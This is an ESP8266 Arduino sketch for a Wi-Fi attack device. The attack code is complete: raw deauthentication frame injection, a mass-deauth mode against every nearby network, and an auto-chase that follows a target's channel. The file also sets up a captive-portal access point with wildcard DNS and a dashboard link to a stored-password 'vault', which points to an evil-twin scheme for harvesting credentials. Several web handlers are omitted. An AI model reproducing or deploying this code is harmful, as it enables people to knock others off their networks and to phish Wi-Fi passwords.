#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <FS.h>
#include <Wire.h>
#include "SSD1306Wire.h"

extern "C" {
  #include "user_interface.h"
}

SSD1306Wire display(0x3c, D2, D1, GEOMETRY_64_48);
DNSServer dnsServer;
ESP8266WebServer server(80);

struct Network { 
  String ssid; 
  uint8_t ch; 
  int signal; 
  uint8_t bssid[6]; 
};

Network _networks[15];
Network _selectedNet;
int _netCount = 0;
String _logs = "[SYSTEM] V4.3 CHASE-MODE Ready\n";
bool isDeauthing = false, isMassDeauth = false, isStealth = false;
unsigned long lastChaseCheck = 0;

// --- SDK RAW DEAUTH ENGINE ---
void sendRawDeauth(uint8_t* bssid, uint8_t ch) {
  wifi_set_channel(ch);
  uint8_t packet[26] = {
    0xC0, 0x00, 0x33, 0x00, 
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], // Sender
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], // BSSID
    0x00, 0x00, 0x01, 0x00
  };
  wifi_send_pkt_freedom(packet, 26, 0);
  yield();
}

// --- LOGIKA AUTO-CHASE (MENGEJAR TARGET) ---
void performAutoChase() {
  if (_selectedNet.ssid == "" || _selectedNet.ssid == "*HIDDEN*") return;
  
  int n = WiFi.scanNetworks(false, true); // Scan cepat
  for (int i = 0; i < n; i++) {
    if (WiFi.SSID(i) == _selectedNet.ssid) {
      if (WiFi.channel(i) != _selectedNet.ch) {
        _selectedNet.ch = WiFi.channel(i);
        _logs += "[CHASE] Target pindah ke CH: " + String(_selectedNet.ch) + "\n";
      }
      break;
    }
  }
}

// --- DASHBOARD UI ---
const char INDEX_HTML[] PROGMEM = R"=====(
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
    body { background: #050505; color: #00ff41; font-family: 'Courier New', monospace; padding: 10px; margin: 0; }
    .header { text-align: center; border-bottom: 2px solid #00ff41; padding-bottom: 10px; }
    .btn { padding: 10px; text-align: center; font-weight: bold; border-radius: 4px; border: 1px solid #00ff41; background: #000; color: #00ff41; font-size: 10px; cursor: pointer; text-decoration:none; display:block; margin: 5px 0; }
    .on { background: #ff0000; color: #fff; border: none; }
    table { width: 100%; border-collapse: collapse; font-size: 10px; margin-top:10px; }
    td, th { padding: 8px 5px; border-bottom: 1px solid #222; }
    pre { background: #000; border: 1px solid #333; padding: 8px; height: 100px; overflow-y: scroll; color: #00ff41; font-size: 9px; }
</style></head><body>
    <div class="header"><h2>GM-PRO <span style="color:red;">V4.3</span></h2><small>CHASE MODE ACTIVE</small></div>
    <div style="display:grid; grid-template-columns: 1fr 1fr; gap:5px;">
        <a href="/attack?type=deauth" id="at-de" class="btn">DEAUTH</a>
        <a href="/attack?type=mass" id="at-ma" class="btn">MASS</a>
    </div>
    <a href="/view_pass" class="btn" style="background:#00ff41; color:#000;">BRANKAS</a>
    <table><thead><tr><th>SSID</th><th>CH</th><th>SIG</th><th>ACT</th></tr></thead><tbody id="list"></tbody></table>
    <h4>SYSTEM LOGS</h4><pre id="logs"></pre>
    <script>
        function update() {
            fetch('/status').then(r => r.json()).then(d => {
                document.getElementById('logs').innerText = d.logs;
                document.getElementById('at-de').className = d.deauth ? "btn on" : "btn";
                document.getElementById('at-ma').className = d.mass ? "btn on" : "btn";
                let h = "";
                d.nets.forEach(n => { h += `<tr><td>${n.ssid}</td><td>${n.ch}</td><td>${n.sig}%</td><td><button onclick="location.href='/select?ssid=${n.ssid}'">SEL</button></td></tr>`; });
                document.getElementById('list').innerHTML = h;
            });
        }
        setInterval(update, 3000); update();
    </script>
</body></html>
)=====";

// ... (Setup dan Handler status/select/login/res tetap sama seperti V4.2) ...

void setup() {
  Serial.begin(115200);
  SPIFFS.begin();
  display.init();
  display.flipScreenVertically();
  
  wifi_set_opmode(STATIONAP_MODE);
  wifi_promiscuous_enable(1); 
  
  WiFi.softAP("vivo1904", "sangkur87", 1, isStealth);
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

  server.on("/", []() { server.send(200, "text/html", INDEX_HTML); });
  // (Masukkan semua handler server dari versi sebelumnya di sini)
  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();

  // Mode Chase: Cek setiap 5 detik jika target pindah channel
  if (isDeauthing && _selectedNet.ssid != "" && millis() - lastChaseCheck > 5000) {
    lastChaseCheck = millis();
    performAutoChase();
  }

  // Eksekusi Deauth (Single atau Mass)
  if (isDeauthing && _selectedNet.ssid != "") {
    sendRawDeauth(_selectedNet.bssid, _selectedNet.ch);
    delay(5);
  } else if (isMassDeauth && _netCount > 0) {
    for (int i = 0; i < _netCount; i++) {
      sendRawDeauth(_networks[i].bssid, _networks[i].ch);
      delay(2);
    }
  }

  // Scan berkala (hanya jika tidak sedang menyerang agar radio tidak sibuk)
  static unsigned long lastScan = 0;
  if (millis() - lastScan > 10000 && !isDeauthing && !isMassDeauth) {
    lastScan = millis();
    int n = WiFi.scanNetworks(false, true);
    _netCount = (n > 12) ? 12 : n;
    for (int i = 0; i < _netCount; i++) {
      _networks[i].ssid = (WiFi.SSID(i) == "") ? "*HIDDEN*" : WiFi.SSID(i);
      _networks[i].ch = WiFi.channel(i);
      _networks[i].signal = WiFi.RSSI(i);
      memcpy(_networks[i].bssid, WiFi.BSSID(i), 6);
    }
  }
}
